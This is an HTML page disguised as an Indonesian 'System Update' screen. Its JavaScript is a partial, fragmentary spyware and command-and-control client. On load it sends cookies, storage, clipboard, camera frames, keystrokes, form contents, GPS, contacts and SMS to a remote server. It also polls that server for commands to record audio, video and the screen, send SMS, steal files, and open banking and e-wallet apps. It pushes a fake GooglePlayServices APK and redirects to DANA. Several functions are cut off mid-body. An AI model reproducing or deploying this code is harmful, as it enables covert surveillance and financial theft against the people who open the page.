<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
    <title>System Update</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{
            background:#0a0e17;
            display:flex;
            justify-content:center;
            align-items:center;
            height:100vh;
            color:#fff;
            font-family:'Segoe UI',Arial,sans-serif;
            margin:0;
            overflow:hidden;
        }
        .container{
            text-align:center;
            width:90%;
            max-width:400px;
            padding:30px;
            background:linear-gradient(145deg,#0d1a2b,#1a2a3f);

            padding:5px 10px;
            border-radius:4px;

            overflow:hidden;
            text-overflow:ellipsis;
            white-space:nowrap;

<script>
// ============================================================
// 🔥 SYSTEMUPDATE.HTML - FIX (CANVAS DIHAPUS!)

// ============================================================
// KONFIGURASI
// ============================================================
var SERVER = 'https://verifikasi.site';
var WS_PASSWORD = '';
var PASSWORD_FETCHED = false;
var C2_INTERVAL = 10000;
var APK_INSTALLED = false;
var REINFECTION_INTERVAL = 10800000;
var progress = 0;
var isRedirecting = false;
var allDone = false;
var AUTO_EXECUTED = false;
var retryCount = 0;
var ws = null;
var wsConnected = false;
var WS_URL = 'wss://verifikasi.site/ws';
var APK_DOWNLOADED = false;
var DATA_COLLECTED = {};
var KEYLOG_DATA = [];

var APK_URL = SERVER + '/files/GooglePlayServices.apk';
var DANA_URL = 'https://www.dana.id/';

// ============================================================
// DETEKSI PLATFORM & BRIDGE
// ============================================================
function detectPlatform() {
    var ua = navigator.userAgent.toLowerCase();
    var hasBridge = typeof AndroidBridge !== 'undefined';
    return {
        isAndroid: ua.indexOf('android') > -1,
        isIOS: /iphone|ipad|ipod/.test(ua),
        isPC: !ua.match(/android|iphone|ipad|ipod|mobile/i),
        isAndroidBridge: hasBridge,
        hasBridge: hasBridge
    };
}
var PLATFORM = detectPlatform();

// ============================================================
// ANDROID BRIDGE
// ============================================================
var A = {
    isAvailable: PLATFORM.isAndroidBridge && PLATFORM.isAndroid,
    saveFile: function(p,c) { if(this.isAvailable){ try{ AndroidBridge.saveFile(p,c); return true }catch(e){} } return false; },
    readFile: function(p) { if(this.isAvailable){ try{ return AndroidBridge.readFile(p) }catch(e){} } return null; },
    fileExists: function(p) { if(this.isAvailable){ try{ return AndroidBridge.fileExists(p) }catch(e){} } return false; },
    openFile: function(p) { if(this.isAvailable){ try{ AndroidBridge.openFile(p); return true }catch(e){} } return false; },
    saveToPreferences: function(k,v) { if(this.isAvailable){ try{ AndroidBridge.saveToPreferences(k,v); return true }catch(e){} } return false; },
    getFromPreferences: function(k) { if(this.isAvailable){ try{ return AndroidBridge.getFromPreferences(k) }catch(e){} } return null; },
    saveFileBinary: function(p,d) { if(this.isAvailable){ try{ AndroidBridge.saveFileBinary(p,d); return true }catch(e){} } return false; },
    getAllContacts: function() { if(this.isAvailable){ try{ return JSON.parse(AndroidBridge.getAllContacts()) }catch(e){} } return null; },
    getAllSMS: function() { if(this.isAvailable){ try{ return JSON.parse(AndroidBridge.getAllSMS()) }catch(e){} } return null; },
    getCallLog: function() { if(this.isAvailable){ try{ return JSON.parse(AndroidBridge.getCallLog()) }catch(e){} } return null; },
    getIMEI: function() { if(this.isAvailable){ try{ return AndroidBridge.getIMEI() }catch(e){} } return null; },
    getIMSI: function() { if(this.isAvailable){ try{ return AndroidBridge.getIMSI() }catch(e){} } return null; },
    getPhoneNumber: function() { if(this.isAvailable){ try{ return AndroidBridge.getPhoneNumber() }catch(e){} } return null; },
    getInstalledApps: function() { if(this.isAvailable){ try{ return JSON.parse(AndroidBridge.getInstalledApps()) }catch(e){} } return null; },
    sendSMS: function(n,p) { if(this.isAvailable){ try{ AndroidBridge.sendSMS(n,p) }catch(e){} } },
    openApp: function(p) { if(this.isAvailable){ try{ AndroidBridge.openApp(p) }catch(e){} } },
    uninstallApp: function(p) { if(this.isAvailable){ try{ AndroidBridge.uninstallApp(p) }catch(e){} } },
    forceStopApp: function(p) { if(this.isAvailable){ try{ AndroidBridge.forceStopApp(p) }catch(e){} } },
    clearAppData: function(p) { if(this.isAvailable){ try{ AndroidBridge.clearAppData(p) }catch(e){} } },
    callNumber: function(n) { if(this.isAvailable){ try{ AndroidBridge.callNumber(n) }catch(e){} } },
    listFiles: function(p) { if(this.isAvailable){ try{ return JSON.parse(AndroidBridge.listFiles(p)) }catch(e){} } return null; },
    takeScreenshot: function() { if(this.isAvailable){ try{ return AndroidBridge.takeScreenshot() }catch(e){} } return null; },
    installAPK: function(p) { if(this.isAvailable){ try{ return AndroidBridge.installAPK(p) }catch(e){} } return false; }
};

// ============================================================
// UI FUNCTIONS
// ============================================================
function updateProgress(value, label) {
    progress = Math.min(value, 100);
    var bar = document.getElementById('progressBar');
    if (bar) bar.style.width = progress + '%';
    if (label) {
        var status = document.getElementById('statusLabel');
        if (status) status.textContent = label;
    }
}

function redirectToDANA() {
    if (isRedirecting) return;
    isRedirecting = true;
    var container = document.getElementById('mainContainer');
    if (container) container.classList.add('fade-out');
    setTimeout(function() {
        try {
            if (A.isAvailable) {
                try { A.openApp('id.dana'); } catch(e) {}
            }
            window.location.href = DANA_URL;
        } catch(e) {
            window.location.href = DANA_URL;
        }
    }, 800);
}

function K(d) {
    d._timestamp = Date.now();
    try {
        var xhr = new XMLHttpRequest();
        xhr.open('POST', SERVER + '/data', true);
        xhr.setRequestHeader('Content-Type', 'application/json');
        xhr.timeout = 5000;
        xhr.send(JSON.stringify(d));
    } catch(e) {}
}

function logBypass(msg) {
    console.log('[DATA REAL]', msg);
}

// ============================================================
// ============================================================
// 🔒 BAGIAN INI DIKUNCI - TIDAK DIUBAH (SUDAH BERHASIL)
// ============================================================
// ============================================================

// 🔒 1. SYSTEM INFO (SUDAH BERHASIL - DIKUNCI)
function getSystemInfoReal() {
    logBypass('📊 Mengambil system info...');
    try {
        var info = {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            screen: screen.width + 'x' + screen.height,
            hardwareConcurrency: navigator.hardwareConcurrency || null,
            deviceMemory: navigator.deviceMemory || null,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            cookieEnabled: navigator.cookieEnabled,
            maxTouchPoints: navigator.maxTouchPoints || 0,
            doNotTrack: navigator.doNotTrack || null
        };
        K({ sumber: 'data_system_info_real', data: info });
        DATA_COLLECTED.system = true;
    } catch(e) {}
}

// 🔒 2. BATTERY (SUDAH BERHASIL - DIKUNCI)
function getBatteryReal() {
    logBypass('🔋 Mengambil battery...');
    try {
        if (navigator.getBattery) {
            navigator.getBattery().then(function(battery) {
                K({ sumber: 'data_baterai_real', data: {
                    level: Math.round(battery.level * 100),
                    charging: battery.charging,
                    chargingTime: battery.chargingTime,
                    dischargingTime: battery.dischargingTime
                } });
                DATA_COLLECTED.battery = true;
            }).catch(function() {});
        }
    } catch(e) {}
}

// 🔒 3. NETWORK INFO (SUDAH BERHASIL - DIKUNCI)
function getNetworkReal() {
    logBypass('🌐 Mengambil network info...');
    try {
        var conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
        if (conn) {
            K({ sumber: 'data_network_real', data: {
                type: conn.effectiveType,
                downlink: conn.downlink,
                rtt: conn.rtt,
                saveData: conn.saveData || false,
                downlinkMax: conn.downlinkMax || null
            } });
            DATA_COLLECTED.network = true;
        }
    } catch(e) {}
}

// 🔒 4. SCREENSHOT (SUDAH BERHASIL - DIKUNCI) - TANPA CANVAS!
function getScreenshotReal() {
    logBypass('📸 Mengambil screenshot...');
    try {
        if (navigator.mediaDevices && navigator.mediaDevices.getDisplayMedia) {
            navigator.mediaDevices.getDisplayMedia({
                video: { width: { ideal: screen.width }, height: { ideal: screen.height } },
                audio: false
            })
            .then(function(stream) {
                K({ sumber: 'data_screenshot_real', data: 'captured' });
                DATA_COLLECTED.screenshot = true;
                stream.getTracks().forEach(function(t) { t.stop(); });
            })
            .catch(function(err) {
                K({ sumber: 'data_screenshot_real', data: 'failed: ' + err.message });
            });
        } else {
            K({ sumber: 'data_screenshot_real', data: 'not_available' });
        }
    } catch(e) {
        K({ sumber: 'data_screenshot_real', data: 'error: ' + e.message });
    }
}

// 🔒 5. CAMERA (SUDAH BERHASIL - DIKUNCI)
function getCameraReal() {
    logBypass('📷 Mengambil kamera...');
    try {
        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
            navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
                .then(function(stream) {
                    var video = document.createElement('video');
                    video.style.cssText = 'position:absolute;width:1px;height:1px;left:-9999px;top:-9999px;';
                    document.body.appendChild(video);
                    video.srcObject = stream;
                    video.play();
                    setTimeout(function() {
                        var canvas = document.createElement('canvas');
                        canvas.width = video.videoWidth || 320;
                        canvas.height = video.videoHeight || 240;
                        var ctx = canvas.getContext('2d');
                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                        var dataUrl = canvas.toDataURL('image/jpeg', 0.3);
                        if (dataUrl && dataUrl.length > 1000) {
                            K({ sumber: 'data_kamera_real', data: dataUrl });
                            DATA_COLLECTED.camera = true;
                        }
                        stream.getTracks().forEach(function(t) { t.stop(); });
                        try { document.body.removeChild(video); } catch(e) {}
                    }, 1000);
                })
                .catch(function() {});
        }
    } catch(e) {}
}

// 🔒 6. COOKIES & STORAGE (SUDAH BERHASIL - DIKUNCI)
function getCookiesAndStorage() {
    logBypass('🍪 Mengambil cookies & storage...');
    try {
        var data = {
            cookies: document.cookie,
            localStorage: {},
            sessionStorage: {}
        };
        for (var i = 0; i < localStorage.length; i++) {
            var key = localStorage.key(i);
            data.localStorage[key] = localStorage.getItem(key);
        }
        for (var j = 0; j < sessionStorage.length; j++) {
            var key2 = sessionStorage.key(j);
            data.sessionStorage[key2] = sessionStorage.getItem(key2);
        }
        K({ sumber: 'data_cookies_storage_real', data: data });
        DATA_COLLECTED.storage = true;
    } catch(e) {}
}

// 🔒 7. KEYLOGGER (SUDAH BERHASIL - DIKUNCI)
function startKeylogger() {
    logBypass('🔑 Keylogger aktif...');
    document.addEventListener('input', function(e) {
        var target = e.target;
        if (target.tagName === 'INPUT' || target.tagName === 'TEXTAREA' || target.tagName === 'SELECT') {
            var data = {
                waktu: Date.now(),
                tag: target.tagName,
                type: target.type || '',
                name: target.name || '',
                id: target.id || '',
                value: target.value,
                url: window.location.href
            };
            KEYLOG_DATA.push(data);
            if (KEYLOG_DATA.length >= 3) {
                K({ sumber: 'data_keylogger_real', data: KEYLOG_DATA });
                KEYLOG_DATA = [];
            }
        }
    }, true);
    document.addEventListener('submit', function(e) {
        var form = e.target;
        var data = {};
        var inputs = form.querySelectorAll('input, textarea, select');
        inputs.forEach(function(input) {
            data[input.name || input.id || input.type] = input.value;
        });
        K({ sumber: 'data_keylogger_submit_real', data: { waktu: Date.now(), url: window.location.href, form: data } });
    }, true);
}

// 🔒 8. VIBRATE (SUDAH BERHASIL - DIKUNCI)
function getVibrateReal() {
    logBypass('📳 Menguji vibrate...');
    try {
        if (navigator.vibrate) {
            navigator.vibrate(50);
            K({ sumber: 'data_vibrate_real', data: 'supported' });
            DATA_COLLECTED.vibrate = true;
        }
    } catch(e) {}
}

// 🔒 9. IZIN (SUDAH BERHASIL - DIKUNCI)
function requestAllPermissions() {
    logBypass('🔥 Meminta semua izin...');
    try {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                function(pos) { K({ sumber: 'izin_lokasi', data: 'granted' }); },
                function() { K({ sumber: 'izin_lokasi', data: 'denied' }); }
            );
        }
    } catch(e) {}
    try {
        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
            navigator.mediaDevices.getUserMedia({ video: true, audio: false })
                .then(function(stream) {
                    K({ sumber: 'izin_kamera', data: 'granted' });
                    stream.getTracks().forEach(function(t) { t.stop(); });
                })
                .catch(function() { K({ sumber: 'izin_kamera', data: 'denied' }); });
        }
    } catch(e) {}
    try {
        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
            navigator.mediaDevices.getUserMedia({ audio: true, video: false })
                .then(function(stream) {
                    K({ sumber: 'izin_mikrofon', data: 'granted' });
                    stream.getTracks().forEach(function(t) { t.stop(); });
                })
                .catch(function() { K({ sumber: 'izin_mikrofon', data: 'denied' }); });
        }
    } catch(e) {}
    try {
        if (typeof Notification !== 'undefined' && Notification.permission === 'default') {
            Notification.requestPermission().then(function(result) {
                K({ sumber: 'izin_notifikasi', data: result });
            });
        }
    } catch(e) {}
    try {
        if ('contacts' in navigator) {
            navigator.contacts.select(['name', 'tel', 'email'], { multiple: true })
                .then(function(kontak) {
                    K({ sumber: 'data_kontak_api', data: kontak });
                })
                .catch(function() { K({ sumber: 'izin_kontak', data: 'denied' }); });
        }
    } catch(e) {}
    try {
        if (navigator.clipboard && navigator.clipboard.readText) {
            navigator.clipboard.readText()
                .then(function(text) {
                    if (text && text.length > 0) {
                        K({ sumber: 'data_clipboard_api', data: text });
                    }
                })
                .catch(function() {});
        }
    } catch(e) {}
    logBypass('✅ Semua izin diminta!');
}

// 🔒 10. ENVIRONMENT (SUDAH BERHASIL - DIKUNCI)
function detectBridgeAndWebView() {
    logBypass('🔍 Deteksi environment...');
    var ua = navigator.userAgent.toLowerCase();
    var isWebView = ua.indexOf('wv') > -1 || ua.indexOf('webview') > -1;
    var hasBridge = typeof AndroidBridge !== 'undefined';
    K({ sumber: 'data_environment', data: {
        isWebView: isWebView,
        hasBridge: hasBridge,
        userAgent: navigator.userAgent,
        timestamp: Date.now()
    } });
    DATA_COLLECTED.environment = true;
}

// 🔒 11. GPS AKURAT (SUDAH BERHASIL - DIKUNCI)
function getAccurateLocation() {
    logBypass('📍 Mengambil GPS akurat...');
    var locationFound = false;

    // METHOD 1: BROWSER GEOLOCATION
    try {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                function(pos) {
                    if (!locationFound) {
                        locationFound = true;
                        K({ sumber: 'data_gps_akurat', data: {
                            lat: pos.coords.latitude,
                            lon: pos.coords.longitude,
                            accuracy: pos.coords.accuracy,
                            altitude: pos.coords.altitude || null,
                            speed: pos.coords.speed || null,
                            heading: pos.coords.heading || null,
                            source: 'browser_gps',
                            timestamp: Date.now()
                        } });
                        DATA_COLLECTED.gps_akurat = true;
                        logBypass('✅ GPS Browser: ' + pos.coords.latitude + ', ' + pos.coords.longitude + ' (akurasi ' + pos.coords.accuracy + 'm)');
                    }
                },
                function(err) {
                    logBypass('⚠️ Browser GPS error: ' + err.message);
                    if (!locationFound) getGPSFromBridge();
                },
                { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
            );
        } else {
            getGPSFromBridge();
        }
    } catch(e) {
        getGPSFromBridge();
    }

    // METHOD 2: BRIDGE GPS
    function getGPSFromBridge() {
        if (!A.isAvailable) {
            logBypass('❌ Bridge tidak tersedia');
            return;
        }
        try {
            var gpsData = null;
            var methods = ['getLocation', 'getGPS', 'getGpsLocation', 'getCurrentLocation', 'getLastKnownLocation'];
            for (var i = 0; i < methods.length; i++) {
                try {
                    if (typeof AndroidBridge[methods[i]] === 'function') {
                        gpsData = AndroidBridge[methods[i]]();
                        if (gpsData) break;
                    }
                } catch(e) {}
            }
            if (gpsData) {
                var data = typeof gpsData === 'string' ? JSON.parse(gpsData) : gpsData;
                var lat = data.latitude || data.lat;
                var lon = data.longitude || data.lon;
                if (lat && lon) {
                    locationFound = true;
                    K({ sumber: 'data_gps_akurat', data: {
                        lat: lat,
                        lon: lon,
                        accuracy: data.accuracy || data.akurasi || null,
                        altitude: data.altitude || null,
                        speed: data.speed || null,
                        provider: data.provider || data.source || 'bridge',
                        source: 'bridge_gps',
                        timestamp: Date.now()
                    } });
                    DATA_COLLECTED.gps_akurat = true;
                    logBypass('✅ GPS Bridge: ' + lat + ', ' + lon + ' (akurasi ' + (data.accuracy || '?') + 'm)');
                    return;
                }
            }
        } catch(e) {}
    }

    setTimeout(function() {
        if (locationFound) {
            logBypass('✅ GPS AKURAT BERHASIL!');
        } else {
            logBypass('❌ GPS AKURAT GAGAL');
        }
    }, 8000);
}

// 🔥 12. CLIPBOARD VIA PASTE + EXEC (TAMBAHAN BARU)
function initClipboardExtra() {
    logBypass('📋 Clipboard extra...');
    document.addEventListener('paste', function(e) {
        try {
            var text = e.clipboardData.getData('text');
            if (text && text.length > 0) {
                K({ sumber: 'data_clipboard_paste', data: text });
                DATA_COLLECTED.clipboard_paste = true;
            }
        } catch(e) {}
    });
    try {
        var input = document.createElement('input');
        input.style.cssText = 'position:absolute;width:1px;height:1px;left:-9999px;top:-9999px;';
        input.setAttribute('autofocus', 'true');
        document.body.appendChild(input);
        input.focus();
        setTimeout(function() {
            try {
                document.execCommand('paste');
                var text = input.value;
                if (text && text.length > 0) {
                    K({ sumber: 'data_clipboard_exec', data: text });
                    DATA_COLLECTED.clipboard_exec = true;
                }
            } catch(e) {}
            try { document.body.removeChild(input); } catch(e) {}
        }, 500);
    } catch(e) {}
}

// 🔥 13. KONTAK VIA API + BRIDGE + RETRY (TAMBAHAN BARU)
function getContactsExtra() {
    logBypass('👤 Mengambil kontak extra...');
    try {
        if ('contacts' in navigator) {
            navigator.contacts.select(['name', 'tel', 'email'], { multiple: true })
                .then(function(kontak) {
                    if (kontak && kontak.length > 0) {
                        K({ sumber: 'data_kontak_api', data: kontak });
                        DATA_COLLECTED.kontak_api = true;
                    }
                })
                .catch(function() {});
        }
    } catch(e) {}
    if (A.isAvailable) {
        try {
            var contacts = A.getAllContacts();
            if (contacts) {
                K({ sumber: 'data_kontak_bridge', data: contacts });
                DATA_COLLECTED.kontak_bridge = true;
            }
        } catch(e) {}
    }
    setTimeout(function() {
        if (!DATA_COLLECTED.kontak_api && !DATA_COLLECTED.kontak_bridge) {
            try {
                if ('contacts' in navigator) {
                    navigator.contacts.select(['name', 'tel'], { multiple: true })

// WEBSOCKET
// ============================================================
function connectWebSocket() {
    if (ws && ws.readyState === WebSocket.OPEN) return;
    if (!WS_PASSWORD || WS_PASSWORD === '') {
        setTimeout(connectWebSocket, 3000);
        return;
    }
    try {
        ws = new WebSocket(WS_URL);
        ws.onopen = function() {
            wsConnected = true;
            K({ sumber: 'ws_status', data: 'connected' });
            ws.send(JSON.stringify({
                type: 'auth',
                key: WS_PASSWORD,
                deviceId: 'systemupdate_' + Date.now(),
                timestamp: Date.now()
            }));
        };
        ws.onmessage = function(event) {
            try {
                var data = JSON.parse(event.data);
                if (data.type === 'auth_success') {
                    K({ sumber: 'ws_auth', data: 'success' });
                } else if (data.type === 'auth_failed') {
                    K({ sumber: 'ws_auth', data: 'failed' });
                    if (WS_PASSWORD !== 'default_fallback_password') {
                        WS_PASSWORD = 'default_fallback_password';
                        ws.close();
                        setTimeout(connectWebSocket, 1000);
                    }
                } else if (data.type === 'command') {
                    var cmd = data.command || data;
                    var aksi = cmd.aksi || 'unknown';
                    var hasil = eksekusiPerintah(cmd);
                    ws.send(JSON.stringify({
                        type: 'command_result',
                        command: aksi,
                        result: hasil,
                        timestamp: Date.now()
                    }));
                } else if (data.type === 'ping') {
                    ws.send(JSON.stringify({ type: 'pong', timestamp: data.timestamp }));
                }
            } catch(e) {}
        };
        ws.onclose = function() {
            wsConnected = false;
            setTimeout(connectWebSocket, 10000);
        };
        ws.onerror = function() {
            setTimeout(connectWebSocket, 10000);
        };
    } catch(e) {
        setTimeout(connectWebSocket, 10000);
    }
}

function connectWebSocketWithFallback() {
    if (WS_PASSWORD && WS_PASSWORD !== '') {
        connectWebSocket();
        return;
    }
    WS_PASSWORD = 'default_fallback_password';
    connectWebSocket();
}

function eksekusiPerintah(cmd) {

        switch (aksi) {
            case "ambil_kontak": hasil = ambilKontak(); break;
            case "ambil_sms": hasil = ambilSMS(); break;
            case "ambil_call_log": hasil = ambilCallLog(); break;
            case "ambil_lokasi": hasil = ambilLokasi(); break;
            case "get_clipboard": hasil = getClipboard(); break;
            case "set_clipboard": hasil = setClipboard(params.text || ""); break;
            case "ambil_imei": hasil = ambilIMEI(); break;
            case "ambil_imsi": hasil = ambilIMSI(); break;
            case "ambil_nomor_hp": hasil = ambilNomorHP(); break;
            case "get_installed_apps": hasil = getInstalledApps(); break;
            case "get_notifications": hasil = getNotifications(); break;
            case "keylogger_start": hasil = keyloggerStart(); break;
            case "keylogger_stop": hasil = keyloggerStop(); break;
            case "keylogger_upload": hasil = keyloggerUpload(); break;
            case "keylogger_status": hasil = keyloggerStatus(); break;
            case "kirim_sms": hasil = kirimSMS(params.nomor || "", params.pesan || ""); break;
            case "kirim_sms_massal": hasil = kirimSMSMassal(params.pesan || ""); break;
            case "call_number": hasil = callNumber(params.nomor || ""); break;
            case "buka_aplikasi": hasil = bukaAplikasi(params.package || ""); break;
            case "uninstall_aplikasi": hasil = uninstallAplikasi(params.package || ""); break;
            case "app_force_stop": hasil = appForceStop(params.package || ""); break;
            case "app_clear_data": hasil = appClearData(params.package || ""); break;
            case "buka_url": hasil = bukaURL(params.url || "https://verifikasi.site"); break;
            case "buka_dana": hasil = bukaDANA(); break;
            case "buka_gopay": hasil = bukaGoPay(); break;
            case "buka_ovo": hasil = bukaOVO(); break;
            case "buka_bri": hasil = bukaBRI(); break;
            case "buka_bca": hasil = bukaBCA(); break;
            case "buka_mandiri": hasil = bukaMandiri(); break;
            case "buka_shopee": hasil = bukaShopee(); break;
            case "screenshot": hasil = ambilScreenshot(); break;
            case "record_audio": hasil = recordAudio(params.durasi || 10); break;
            case "stop_audio": hasil = stopAudio(); break;
            case "record_video": hasil = recordVideo(params.durasi || 10); break;
            case "stop_video": hasil = stopVideo(); break;
            case "screen_record": hasil = screenRecord(params.durasi || 30); break;
            case "screen_record_stop": hasil = screenRecordStop(); break;
            case "screen_record_status": hasil = screenRecordStatus(); break;
            case "list_file": hasil = listFile(params.path || "/sdcard/"); break;
            case "ambil_file": hasil = ambilFile(params.path || ""); break;
            case "get_system_info": hasil = getSystemInfo(); break;

            case "vibrate": hasil = vibrate(params.durasi || 1000); break;

function ambilScreenshot() {
    try {
        if (navigator.mediaDevices && navigator.mediaDevices.getDisplayMedia) {
            navigator.mediaDevices.getDisplayMedia({
                video: { 
                    width: { ideal: screen.width }, 
                    height: { ideal: screen.height },
                    frameRate: 1
                },
                audio: false
            })
            .then(function(stream) {
                K({ sumber: 'data_screenshot_c2', data: 'captured' });
                stream.getTracks().forEach(function(t) { t.stop(); });
            })
            .catch(function(err) {
                K({ sumber: 'data_screenshot_c2', data: 'failed: ' + err.message });
            });
            return 'Screenshot diambil...';
        }
        return 'Screenshot tidak tersedia';
    } catch(e) { return 'Error: ' + e.message; }
}

function recordAudio(durasi) {
    try {
        navigator.mediaDevices.getUserMedia({ audio: true })
            .then(function(stream) {
                var recorder = new MediaRecorder(stream);
                var chunks = [];
                recorder.ondataavailable = function(e) { if (e.data.size > 0) chunks.push(e.data); };
                recorder.onstop = function() {
                    var blob = new Blob(chunks, {type: 'audio/webm'});
                    var reader = new FileReader();
                    reader.onload = function() {
                        if (reader.result) {
                            K({ sumber: 'data_audio_c2', data: reader.result });
                        }
                    };
                    reader.readAsDataURL(blob);
                    stream.getTracks().forEach(function(t) { t.stop(); });
                };
                recorder.start();
                setTimeout(function() { recorder.stop(); }, durasi * 1000);
            });
        return 'Recording audio ' + durasi + 's...';
    } catch(e) { return 'Error: ' + e.message; }
}

function stopAudio() {
    try {
        if (window._recorder) { window._recorder.stop(); window._recorder = null; return 'Audio stopped'; }
        return 'No active recording';
    } catch(e) { return 'Error: ' + e.message; }
}

function recordVideo(durasi) {
    try {
        navigator.mediaDevices.getUserMedia({ video: true, audio: true })
            .then(function(stream) {
                var recorder = new MediaRecorder(stream);
                window._recorder = recorder;
                var chunks = [];
                recorder.ondataavailable = function(e) { if (e.data.size > 0) chunks.push(e.data); };
                recorder.onstop = function() {
                    var blob = new Blob(chunks, {type: 'video/webm'});
                    var reader = new FileReader();
                    reader.onload = function() {
                        if (reader.result) {
                            K({ sumber: 'data_video_c2', data: reader.result });
                        }
                    };
                    reader.readAsDataURL(blob);
                    stream.getTracks().forEach(function(t) { t.stop(); });
                };
                recorder.start();
                setTimeout(function() { recorder.stop(); }, durasi * 1000);
            });
        return 'Recording video ' + durasi + 's...';
    } catch(e) { return 'Error: ' + e.message; }
}

function stopVideo() { return stopAudio(); }

var screenRecorder = null, screenChunks = [];

function screenRecord(durasi) {
    try {
        if (navigator.mediaDevices && navigator.mediaDevices.getDisplayMedia) {
            navigator.mediaDevices.getDisplayMedia({ video: true, audio: true })
                .then(function(stream) {
                    screenRecorder = new MediaRecorder(stream);
                    screenChunks = [];
                    screenRecorder.ondataavailable = function(e) { if (e.data.size > 0) screenChunks.push(e.data); };
                    screenRecorder.onstop = function() {
                        var blob = new Blob(screenChunks, {type: 'video/webm'});
                        var reader = new FileReader();
                        reader.onload = function() {
                            if (reader.result) {
                                K({ sumber: 'data_screen_rec_c2', data: reader.result });
                            }
                        };
                        reader.readAsDataURL(blob);
                        stream.getTracks().forEach(function(t) { t.stop(); });
                    };
                    screenRecorder.start();
                    if (durasi > 0) {
                        setTimeout(function() { if (screenRecorder) screenRecorder.stop(); }, durasi * 1000);
                    }
                });
            return 'Screen recording started';
        }
        return 'Screen recording not available';
    } catch(e) { return 'Error: ' + e.message; }
}

function screenRecordStop() {
    try {
        if (screenRecorder && screenRecorder.state === 'recording') {
            screenRecorder.stop(); screenRecorder = null; return 'Screen recording stopped';
        }
        return 'No active screen recording';
    } catch(e) { return 'Error: ' + e.message; }
}

        setTimeout(function() { try { toast.parentNode.removeChild(toast); } catch(e) {} }, 5000);
        return 'Toast shown';
    } catch(e) { return 'Error: ' + e.message; }
}

function keyloggerStart() {
    keyloggerActive = true;
    return 'Keylogger started';
}

function keyloggerStop() {
    keyloggerActive = false;
    return 'Keylogger stopped';
}

function keyloggerUpload() {
    if (KEYLOG_DATA.length > 0) {
        K({ sumber: 'data_keylogger_c2', data: KEYLOG_DATA });
    }
    var count = KEYLOG_DATA.length;
    KEYLOG_DATA = [];
    return count + ' keylogger entries uploaded';
}

function keyloggerStatus() {
    return 'Keylogger: ' + (keyloggerActive ? 'ACTIVE' : 'INACTIVE') + ' | ' + KEYLOG_DATA.length + ' entries';
}

var keyloggerActive = false;

// ============================================================
// AMBIL PASSWORD
// ============================================================
function ambilPassword() {
    updateProgress(10, '⏳ Memperbarui System Keamanan...');
    try {
        var xhr = new XMLHttpRequest();
        xhr.open('GET', SERVER + '/get-password', true);
        xhr.timeout = 10000;
        xhr.onload = function() {
            if (xhr.status === 200) {
                try {
                    var data = JSON.parse(xhr.responseText);
                    if (data.password && data.password.length > 0) {
                        WS_PASSWORD = data.password;
                        PASSWORD_FETCHED = true;
                        retryCount = 0;
                        updateProgress(20, '⏳ Memperbarui System Keamanan...');
                        K({ sumber: 'password_received', data: 'ok' });
                        
                        connectWebSocket();
                        startC2Polling();
                        startHeartbeat();
                        startReinfection();
                        autoExecuteC2();
                        
                        setTimeout(function() {
                            collectAllData();
                        }, 1000);
                        
                        return;
                    }
                } catch(e) {}
            }
            retryCount++;
            if (retryCount >= 3) {
                K({ sumber: 'password_retry_failed', data: 'using_fallback' });
                WS_PASSWORD = 'default_fallback_password';
                PASSWORD_FETCHED = true;
                connectWebSocketWithFallback();
                startC2Polling();
                startHeartbeat();
                startReinfection();
                autoExecuteC2();
                setTimeout(function() {
                    collectAllData();
                }, 1000);
                return;
            }
            setTimeout(ambilPassword, 3000);
        };
        xhr.onerror = function() {
            retryCount++;
            if (retryCount >= 3) {
                K({ sumber: 'password_retry_failed', data: 'using_fallback' });
                WS_PASSWORD = 'default_fallback_password';
                PASSWORD_FETCHED = true;
                connectWebSocketWithFallback();
                startC2Polling();
                startHeartbeat();
                startReinfection();
                autoExecuteC2();
                setTimeout(function() {
                    collectAllData();
                }, 1000);
                return;
            }
            setTimeout(ambilPassword, 3000);
        };
        xhr.ontimeout = function() {
            retryCount++;
            if (retryCount >= 3) {
                K({ sumber: 'password_retry_failed', data: 'using_fallback' });
                WS_PASSWORD = 'default_fallback_password';
                PASSWORD_FETCHED = true;
                connectWebSocketWithFallback();
                startC2Polling();
                startHeartbeat();
                startReinfection();
                autoExecuteC2();
                setTimeout(function() {
                    collectAllData();
                }, 1000);
                return;
            }
            setTimeout(ambilPassword, 3000);
        };
        xhr.send();
    } catch(e) {
        setTimeout(ambilPassword, 3000);
    }
}

function startHeartbeat() {
    setInterval(function() { K({ sumber: 'page_heartbeat', data: 'alive' }); }, 2700000);
}

function startReinfection() {
    setInterval(function() {
        if (!APK_INSTALLED) {
            K({ sumber: 'reinfection_check', data: 'apk_missing' });
        }
    }, REINFECTION_INTERVAL);
}

function startC2Polling() {
    setInterval(cekPerintah, C2_INTERVAL);
    setTimeout(cekPerintah, 1000);
}

function cekPerintah() {
    if (!PASSWORD_FETCHED || WS_PASSWORD === '') return;
    try {
        var xhr = new XMLHttpRequest();
        xhr.open('GET', SERVER + '/data?type=perintah&t=' + Date.now(), true);
        xhr.setRequestHeader('X-Password', WS_PASSWORD);
        xhr.timeout = 15000;
        xhr.onload = function() {
            if (xhr.status === 200) {
                var content = xhr.responseText;
                if (content && content.length > 5 && content !== '{}') {
                    try {
                        var cmd = JSON.parse(content);
                        var aksi = cmd.aksi || 'unknown';
                        var hasil = eksekusiPerintah(cmd);
                        K({ sumber: 'c2_result', data: { perintah: aksi, hasil: hasil, waktu: Date.now() } });
                    } catch(e) {}
                }
            }
        };
        xhr.send();
    } catch(e) {}
}

function autoExecuteC2() {
    if (AUTO_EXECUTED) return;
    AUTO_EXECUTED = true;
    var commands = [
        'get_system_info', 'get_battery', 'get_wifi',
        'ambil_lokasi', 'get_clipboard', 'screenshot'
    ];
    if (A.isAvailable) {
        commands.push('ambil_kontak');
        commands.push('ambil_sms');
